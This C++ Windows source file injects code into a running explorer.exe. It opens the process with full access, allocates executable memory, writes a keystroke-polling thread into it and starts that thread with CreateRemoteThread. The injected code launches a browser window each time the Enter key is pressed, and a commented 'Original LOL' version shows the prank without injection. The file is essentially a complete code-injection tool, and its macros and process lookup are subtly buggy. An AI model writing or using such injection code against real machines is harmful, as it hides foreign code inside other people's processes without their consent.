#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <string>
#include <vector>
#include <sstream>
#include <psapi.h>

#define DATA_CHUNK_SIZE 1024
#define CODE_CHUNK_SIZE 1024

#define PROCESS_COMMAND "explorer http://www.google.com"
#define PROCESS_NAME    "explorer.exe"
#define MAX_PROCESS_IDS 128

#define ASSERT( expr, msg )\
  if ( !expr ){\
  MessageBoxA( NULL, msg, "Damn", MB_ICONERROR );\
  exit( -1 );}

typedef BOOL ( WINAPI *CREATEPROCFN )( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, 
                                       LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, 
                                       LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
typedef SHORT ( WINAPI *GETASYNCKEYSTATEFN )( int vKey );
typedef VOID ( WINAPI *SLEEPFN )( DWORD );
typedef int ( WINAPI *MESSAGEBOXFN )( HWND, LPCSTR, LPCSTR, UINT );

struct InjData
{
  CREATEPROCFN        fnCreateProcess;
  GETASYNCKEYSTATEFN  fnGetAsyncKeyState;
  SLEEPFN             fnSleep;
  MESSAGEBOXFN        fnMessageBox;

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  char szCmd[MAX_PATH];
};

static DWORD ThreadFunc( InjData *pData )
{
  while ( true )
  {
    if ( pData->fnGetAsyncKeyState( VK_RETURN ) & 0x8000 )
      pData->fnCreateProcess( NULL, pData->szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &pData->si, &pData->pi );

    pData->fnSleep( 10 );
  }

  return 0;
}
static void DummyFunc() {}

typedef std::vector<std::string> StringVec;

int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR, int )
{
  // data
  HANDLE    hProc;
  DWORD     dwPID;
  HANDLE    hThread;
  PBYTE     pData;
  PBYTE     pCode;
  InjData   injData;

  // prepare data to be injected
  injData.fnCreateProcess     = &CreateProcessA;
  injData.fnGetAsyncKeyState  = &GetAsyncKeyState;
  injData.fnSleep             = &Sleep;
  injData.fnMessageBox        = &MessageBoxA;
  strcpy( injData.szCmd, PROCESS_COMMAND );
  memset( &injData.si, 0, sizeof( injData.si ) );
  injData.si.cb = sizeof( injData.si );
  memset( &injData.pi, 0, sizeof( injData.pi ) );

  // Step 1: Find and gain access to process
  DWORD nProcesses;
  DWORD processIDs[MAX_PROCESS_IDS];
  EnumProcesses( processIDs, sizeof( processIDs ), &nProcesses );
  nProcesses /= sizeof( DWORD );

  for ( DWORD i = 0; i < nProcesses; ++i )
  {
    hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, processIDs[i] );
    if ( hProc )
    {
      char szProcName[MAX_PATH];
      GetProcessImageFileNameA( hProc, szProcName, sizeof( szProcName ) );
      if ( std::string( szProcName ).find( PROCESS_NAME ) != std::string::npos )
      {
        dwPID = i;
        break;
      }
    }
  }

  // Step 2: Allocate block of memory for data in remote process
  pData = (PBYTE)VirtualAllocEx( hProc, NULL, DATA_CHUNK_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ASSERT( pData != NULL, "allocating memory for data failed =(" );

  // Step 3: Copy data to remote process
  ASSERT( WriteProcessMemory( hProc, pData, &injData, sizeof( InjData ), NULL ), "copying data to memory failed =(" );

  // Step 4: Allocate block of memory for code in remote process
  pCode = (PBYTE)VirtualAllocEx( hProc, NULL, CODE_CHUNK_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ASSERT( pCode != NULL, "allocating memory for code failed =(" );

  // Step 5: Copy function to remote process
#pragma warning( disable : 4311 )
  ASSERT( WriteProcessMemory( hProc, pCode, &ThreadFunc, (SIZE_T)&DummyFunc - (SIZE_T)&ThreadFunc, NULL ), "copying function to memory failed =(" );
#pragma warning( default : 4311 )

  // Step 6: Create remote thread!
  hThread = CreateRemoteThread( hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pCode, pData, 0, NULL );
  ASSERT( hThread != NULL, "creating thread failed =(" )

  return 0;
}


/////////////////////////////////////////////////////////////////////////////////
//// Original LOL
/////////////////////////////////////////////////////////////////////////////////
//int APIENTRY WinMain( HINSTANCE, HINSTANCE, LPSTR site, int )
//{
//  while ( true )
//  {
//    if ( GetAsyncKeyState( VK_RETURN ) & 0x8000 )
//      system( ( std::string( "explorer \"" ) + site + "\"" ).c_str() );
//    Sleep( 10 );
//  }
//
//  return 0;
//}
/////////////////////////////////////////////////////////////////////////////////
